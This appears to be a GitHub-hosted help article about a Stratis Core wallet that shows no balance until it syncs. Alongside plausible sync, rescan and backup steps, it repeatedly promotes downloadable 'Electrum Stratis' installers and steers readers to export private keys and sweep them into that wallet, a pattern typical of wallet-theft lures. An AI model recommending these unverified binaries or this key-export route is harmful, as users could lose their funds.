![Electrum-Stratis](assets/banner-article.png)

# Coins sent to Core 2.2.1: what the balance is waiting for

<p align="center">A full node that has not read the chain</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

A legacy Stratis Core wallet holds coins on the same chain Electrum Stratis serves, so a payment sent to a Core address is not lost - it is waiting for a wallet that has finished syncing. Core downloads and verifies the whole chain, and until its height reaches the block containing your transaction, the balance is genuinely unknown to it. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain, and it can spend those coins once you have the key.

## You'll see this if

<div align="center">

| What you see in Core | What it means | What to do |
|---|---|---|
| "Processed 0 out of 0 blocks" | No peers, nothing synced | Fix connectivity first |
| Height climbing slowly | Normal full-node sync | Wait, or migrate the key |
| Synced, balance missing | Transaction not in the wallet's view | Rescan |
| Balance present, spend fails | Locked coins or fee issue | Check maturity and fee |
| Wallet will not open | File or password problem | Back up before anything |

</div>

The distinction that saves time: an unsynced Core wallet is not a wallet with a missing balance, it is a wallet that has not read the chain yet. Nothing is wrong with the coins.

## Why it happens

Core is a full node. It stores the chain, validates it and derives its view of your addresses from that local copy, which means a fresh install has to download everything before it can answer a balance question. Electrum Stratis takes the other approach: it asks servers for the headers and the history of its own addresses, so it is usable in minutes.

Coins sent to Core are ordinary chain outputs. They exist regardless of which wallet knows about them, and they stay spendable by whoever holds the key. That is why "sent to Core" is not a category of loss; it is a category of waiting.

## Fix

1. **Check peers before anything else.** Zero peers means zero progress; a full node with no connection will sit at "0 out of 0 blocks" indefinitely and no amount of waiting helps.
2. **Let it sync if it is syncing.** A height that advances is a wallet doing its job. The chain is large; the first sync is the slow one.
3. **Rescan if the height is current and the balance is not.** A wallet that has the blocks but not the transaction needs to look again, which the rescan option does.
4. **Recover by key if waiting is not acceptable.** Export the address's private key from Core and sweep it in Electrum Stratis, which reaches a usable state in minutes rather than days.
5. **Back up the wallet file before repairing anything.** The file is the only copy of keys that were generated individually; repairs, rescans and reinstalls all assume it survives.

Once the key is swept, the coins sit at an address derived from your seed, and the Core node becomes optional rather than necessary.

## If that did not work

If Core reports a corrupted database, restore the wallet file into a clean data directory rather than repairing in place; the chain can be re-downloaded, the keys cannot.

If a rescan finishes and the balance is still absent, confirm the address belongs to this wallet. A payment to an address from a different wallet is visible on chain and invisible here, which is a correct result rather than a fault.

If the transaction was sent to an address you no longer have a key for, the coins are unspendable by you. That is the one case where the waiting never ends, and it is a key problem, not a sync problem.

Core also keeps its own copy of the keys, which is why the wallet file matters more than the chain data. The chain can be re-downloaded from peers at any time; the file cannot be reconstructed from anything the network holds. Backing it up before a rescan, a repair or a reinstall is the one step that makes every other step reversible. When you are ready to move the balance to a seed, the current release of this wallet is on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), and [an Electrum Stratis restore that will not connect](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/restored-but-still-offline.md).

## Prevention

- Keep the Core wallet file backed up, separate from the data directory.
- Note the addresses you gave out, so a later search has a starting point.
- Send to your own addresses only after confirming they belong to a wallet you can open.
- Migrate keys to a seed-based wallet when you want a backup that is one phrase.
- Check peers whenever a full node seems stuck.
- Recover with the actively maintained build rather than an old installer found by search.

## FAQ

### I sent coins to my Core wallet and the balance is zero. Are they gone?

Almost certainly not. They are on chain at the address you sent to, and Core will show them once it has synced and, if needed, rescanned. A node that has not read the chain cannot report a balance.

### Why does Core say "Processed 0 out of 0 blocks"?

Because it has no peers, so it has no blocks to process. That is a connectivity fault, not a wallet fault: once a peer answers, the count starts moving.

### Can Electrum Stratis read my Core wallet directly?

No. Different formats and different key models. The bridge is the private key: export it from Core and sweep it into Electrum Stratis, which moves the coins to seed-backed addresses.

### How long does a Core sync take?

It depends on the machine, the disk and the peers, and no honest figure can be given without measuring it. If the wait is unacceptable, the key export and sweep route reaches a spendable state far sooner.

<!-- DOWNLOAD-BLOCK -->

A deposit to a Core wallet address is not lost, it is waiting for software that can see it. Core held keys it generated itself, so no seed restores them; what restores the balance is the wallet file or a key export from that machine. If neither exists, the coins remain at an address nobody can spend from, which is a backup failure rather than a chain failure.

## Related articles

- [The Qt wallet does not work with a seed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/qt-wallet-has-no-seed.md)
- [dumpprivkey to Sweep, in order](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/export-a-key-and-sweep-it.md)
- [Why the balance is missing, in three causes](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md)
- [Why "Not Connected" happens](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/wallet-says-not-connected.md)
